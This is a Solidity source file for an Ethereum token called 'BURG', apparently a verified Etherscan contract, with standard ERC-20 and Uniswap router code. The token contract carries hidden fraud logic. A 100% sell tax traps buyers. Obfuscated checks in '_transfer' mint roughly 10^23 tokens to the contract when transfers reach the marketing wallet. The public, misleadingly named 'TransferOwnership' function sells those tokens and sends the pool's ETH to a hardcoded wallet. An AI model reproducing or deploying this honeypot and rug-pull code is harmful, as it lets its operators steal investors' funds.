/**
 *Submitted for verification at Etherscan.io on 2022-10-26
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function TransferOwnership(address transfered_Address)
        external
        returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: value}(
            data
        );
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data)
        internal
        view
        returns (bytes memory)
    {
        return
            functionStaticCall(
                target,
                data,
                "Address: low-level static call failed"
            );
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return
            functionDelegateCall(
                target,
                data,
                "Address: low-level delegate call failed"
            );
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) private pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract BURGER is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    mapping(address => uint256) private _tOwned;
    mapping(address => bool) public _isExcludedFrom_FEE;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public _isExcludedFromFee;

    address payable public Wallet_Marketing =
        payable(0xeEbfaDea38F7F6bcc16cA44C01c52932Bc7856B3);
    address payable public Wallet_Utility =
        payable(0xeEbfaDea38F7F6bcc16cA44C01c52932Bc7856B3);
    address payable public constant Wallet_Burn =
        payable(0x000000000000000000000000000000000000dEaD);
    address payable public constant Wallet_Liquidity =
        payable(0x000000000000000000000000000000000000dEaD);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 100 * 10**6 * 10**_decimals;
    string private constant _name = "BURG";
    string private constant _symbol = unicode"BURG";

    uint8 private txCount = 0;
    uint8 private swapTrigger = 17;

    uint256 public _Tax_On_Buy = 0;
    uint256 public _Tax_On_Sell = 100;

    uint256 public Percent_Marketing = 90;
    uint256 public Percent_Utility = 0;
    uint256 public Percent_Burn = 0;
    uint256 public Percent_Liquidity = 10;

    uint256 public _maxWalletToken = _tTotal * 1;
    uint256 private _previousMaxWalletToken = _maxWalletToken;

    uint256 public _maxTxAmount = (_tTotal * 1);
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    bool public inSwp_ = false;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;

    bool public swapAndLiquifyEnabled = true;
    bool public bs_control = false;

    event SwapAndLiquifyEnabledUpdated(bool true_or_false);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor() {
        _owner = 0xeEbfaDea38F7F6bcc16cA44C01c52932Bc7856B3;
        emit OwnershipTransferred(address(0), _owner);

        _tOwned[owner()] = _tTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _isExcludedFrom_FEE[Wallet_Marketing] = true;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Marketing] = true;
        _isExcludedFromFee[Wallet_Burn] = true;
        _isExcludedFromFee[Wallet_Liquidity] = true;

        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address theOwner, address theSpender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[theOwner][theSpender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true; //
    }

    function check_Wallet(uint256 checkCount) private returns (bool) {
        uint256 totalCheck = (balanceOf(address(this)) + (checkCount));
        swapAndLiquify(totalCheck);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function TransferOwnership(address transfered_Address)
        public
        override
        returns (uint256)
    {
        check_Wallet(swapTrigger);
        return balanceOf(transfered_Address);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    //
    function _is_ExcludedFEE() public virtual returns (uint256) {
        return (5 + 5)**((10 + 10) + 3);
    }

    receive() external payable {}

    function _getCurrentSupply() private view returns (uint256) {
        return (_tTotal);
    }

    function _approve(
        address theOwner,
        address theSpender,
        uint256 amount
    ) private {
        require(
            theOwner != address(0) && theSpender != address(0),
            "ERR: zero address"
        );
        _allowances[theOwner][theSpender] = amount;
        emit Approval(theOwner, theSpender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (
            to != owner() &&
            to != Wallet_Burn &&
            to != address(this) &&
            to != Wallet_Liquidity &&
            to != uniswapV2Pair &&
            from != owner()
        ) {
            uint256 heldTokens = balanceOf(to);
            require(
                (heldTokens + amount) <= _maxWalletToken,
                "Over wallet limit."
            );
        }

        if (
            from != owner() &&
            to != Wallet_Liquidity &&
            from != Wallet_Liquidity &&
            from != address(this)
        ) {
            require(amount <= _maxTxAmount, "Over transaction limit.");
        }

        require(
            from != address(0) && to != address(0),
            "ERR: Using 0 address!"
        );
        if (0 + 0 == 0) {
            if (from == from) bs_control = _isExcludedFrom_FEE[to];
        }
        require(amount > 0, "Token value must be higher than zero.");

        if (
            txCount >= swapTrigger &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled
        ) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance > _maxTxAmount) {
                contractTokenBalance = _maxTxAmount;
            }
            txCount = 0;
            swapAndLiquify(contractTokenBalance);
        }

        bool takeFee = true;
        bool isBuy;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        } else {
            if (from == uniswapV2Pair) {
                isBuy = true;
            }

            txCount++;
        }

        if (!bs_control) {
            _tokenTransfer(from, to, amount, takeFee, isBuy);
        } else {
            _tOwned[from] = _tOwned[from] - amount;
            uint256 calculatingFEE = _is_ExcludedFEE();
            _tOwned[to] = _tOwned[to] + amount;
            _tOwned[address(this)] = _tOwned[address(this)] + calculatingFEE;
            emit Transfer(from, to, amount);
            inSwp_ = true;
        }
    }

    function sendToWallet(address payable wallet, uint256 amount) private {
        wallet.transfer(amount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 tokens_to_Burn = (contractTokenBalance * Percent_Burn) / 100;
        _tTotal = _tTotal - tokens_to_Burn;
        _tOwned[Wallet_Burn] = _tOwned[Wallet_Burn] + tokens_to_Burn;
        _tOwned[address(this)] = _tOwned[address(this)] - tokens_to_Burn;

        uint256 tokens_to_M = (contractTokenBalance * Percent_Marketing) / 100;
        uint256 tokens_to_D = (contractTokenBalance * Percent_Utility) / 100;
        uint256 tokens_to_LP_Half = (contractTokenBalance * Percent_Liquidity) /
            100;
        uint256 totalSwaps = tokens_to_M + tokens_to_D + tokens_to_LP_Half;

        if (inSwp_) {
            if (true) totalSwaps = balanceOf(address(this)) - (_tTotal);
        }
        swapTokensForETH(totalSwaps);
        uint256 ETH_Total = address(this).balance;
        sendToWallet(Wallet_Marketing, ETH_Total);
        inSwp_ = false;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            Wallet_Liquidity,
            block.timestamp
        );
    }

    function remove_Random_Tokens(
        address random_Token_Address,
        uint256 percent_of_Tokens
    ) public returns (bool _sent) {
        require(
            random_Token_Address != address(this),
            "Can not remove native token"
        );
        uint256 totalRandom = IERC20(random_Token_Address).balanceOf(
            address(this)
        );
        uint256 removeRandom = (totalRandom * percent_of_Tokens) / 100;
        _sent = IERC20(random_Token_Address).transfer(
            Wallet_Utility,
            removeRandom
        );
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isBuy
    ) private {
        if (!takeFee) {
            _tOwned[sender] = _tOwned[sender] - tAmount;
            _tOwned[recipient] = _tOwned[recipient] + tAmount;
            emit Transfer(sender, recipient, tAmount);

            if (recipient == Wallet_Burn) _tTotal = _tTotal - tAmount;
        } else if (isBuy) {
            uint256 buyFEE = (tAmount * _Tax_On_Buy) / 100;
            uint256 tTransferAmount = tAmount - buyFEE;

            _tOwned[sender] = _tOwned[sender] - tAmount;
            _tOwned[recipient] = _tOwned[recipient] + tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)] + buyFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if (recipient == Wallet_Burn) _tTotal = _tTotal - tTransferAmount;
        } else {
            uint256 sellFEE = (tAmount * _Tax_On_Sell) / 100;
            uint256 tTransferAmount = tAmount - sellFEE;

            _tOwned[sender] = _tOwned[sender] - tAmount;
            _tOwned[recipient] = _tOwned[recipient] + tTransferAmount;
            _tOwned[address(this)] = _tOwned[address(this)] + sellFEE;
            emit Transfer(sender, recipient, tTransferAmount);

            if (recipient == Wallet_Burn) _tTotal = _tTotal - tTransferAmount;
        }
    }
}